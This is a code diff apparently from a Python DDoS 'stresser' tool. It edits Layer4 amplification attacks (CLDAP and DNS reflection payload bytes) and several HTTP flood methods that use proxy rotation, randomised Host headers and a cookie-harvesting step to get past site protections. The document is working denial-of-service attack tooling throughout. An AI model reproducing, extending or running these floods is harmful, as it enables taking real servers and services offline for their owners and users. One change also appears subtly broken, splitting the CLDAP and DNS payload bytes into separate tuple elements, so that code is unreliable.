@@ -33,7 +33,7 @@ from dns import resolver
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
-from requests import Response, Session, exceptions, get
+from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
@@ -100,7 +100,7 @@ google_agents = [
 ]
 
 
-class Counter(object):
+class Counter:
     def __init__(self, value=0):
         self._value = RawValue('i', value)
 
@@ -284,6 +284,7 @@ class Layer4(Thread):
         else:
             s = socket(conn_type, sock_type, proto_type)
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        s.settimeout(60)
         s.connect(self._target)
         return s
 
@@ -306,8 +307,9 @@ class Layer4(Thread):
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "CLDAP":
-            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
-                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00', 389)
+            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00',
+                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
+                                 389)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "MEM":
@@ -329,8 +331,9 @@ class Layer4(Thread):
             self._amp_payloads = cycle(self._generate_amp())
         if name == "DNS":
             self._amp_payload = (
-                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
-                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
+                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00',
+                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
+                53)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
 
@@ -586,6 +589,7 @@ class HttpFlood(Thread):
             sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        sock.settimeout(60)
         sock.connect(self._raw_target)
 
         if self._target.scheme.lower() == "https":
@@ -761,8 +765,10 @@ class HttpFlood(Thread):
         with suppress(Exception), self.open_connection() as s:
             Tools.send(s, payload)
             sleep(5.01)
+            ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                if time() > ts + 120: break
         Tools.safe_close(s)
 
     def AVB(self):
@@ -777,7 +783,11 @@ class HttpFlood(Thread):
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
         s = None
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), Session() as s:
+            with s.post(self._target.human_repr()) as ss:
+                ss.raise_for_status()
+                for key, value in ss.cookies.items():
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
             for _ in range(min(self._rpc, 5)):
                 sleep(min(self._rpc, 5) / 100)
                 if self._proxies:
@@ -794,7 +804,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def DYN(self):
-        payload: str | bytes = str.encode(self._payload +
+        payload: Any = str.encode(self._payload +
                                           "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
                                           self.randHeadercontent +
                                           "\r\n")
@@ -805,7 +815,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def DOWNLOADER(self):
-        payload: str | bytes = self.generate_payload()
+        payload: Any = self.generate_payload()
 
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -863,7 +873,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def NULL(self) -> None:
-        payload: str | bytes = str.encode(self._payload +
+        payload: Any = str.encode(self._payload +
                                           "Host: %s\r\n" % self._target.authority +
                                           "User-Agent: null\r\n" +
                                           "Referrer: null\r\n" +
@@ -878,7 +888,6 @@ class HttpFlood(Thread):
         pro = randchoice(self._proxies)
 
         run([
-            f'{Path.home() / "go/bin/bombardier"}',
             f'{bombardier_path}',
             f'--connections={self._rpc}',
             '--http2',
@@ -920,6 +929,8 @@ class HttpFlood(Thread):
             self.SENT_FLOOD = self.APACHE
         if name == "BYPASS":
             self.SENT_FLOOD = self.BYPASS
+        if name == "DGB":
+            self.SENT_FLOOD = self.DGB
         if name == "OVH":
             self.SENT_FLOOD = self.OVH
         if name == "AVB":
@@ -983,8 +994,7 @@ class ProxyManager:
                         data.splitlines(), proxy_type):
                     proxes.add(proxy)
             except Exception as e:
-                logger.error('Download Proxy Error: %s' %
-                             (e.__str__() or e.__repr__()))
+                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
         return proxes
 
 
@@ -1000,7 +1010,7 @@ class ToolsConsole:
 
     @staticmethod
     def runConsole():
-        cons = "%s@BetterStresser:~#" % gethostname()
+        cons = f"{gethostname()}@MHTools:~#"
 
         while 1:
             cmd = input(cons + " ").strip()
@@ -1027,7 +1037,7 @@ class ToolsConsole:
                 continue
 
             if not {cmd} & ToolsConsole.METHODS:
-                print("%s command not found" % cmd)
+                print(f"{cmd} command not found")
                 continue
 
             if cmd == "DSTAT":
@@ -1141,8 +1151,8 @@ class ToolsConsole:
                     print('please wait ...', end="\r")
 
                     info = ToolsConsole.ts_srv(domain)
-                    logger.info("TCP: %s\n" % (info['_tsdns._tcp.']))
-                    logger.info("UDP: %s\n" % (info['_ts3._udp.']))
+                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
+                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
 
             if cmd == "PING":
                 while True:
@@ -1327,7 +1337,7 @@ if __name__ == '__main__':
                                     argv[5].strip())
                     useragent_li = Path(__dir__ / "files/useragent.txt")
                     referers_li = Path(__dir__ / "files/referers.txt")
-                    bombardier_path = Path(__dir__ / "go/bin/bombardier")
+                    bombardier_path = Path.home() / "go/bin/bombardier"
                     proxies: Any = set()
 
                     if method == "BOMB":
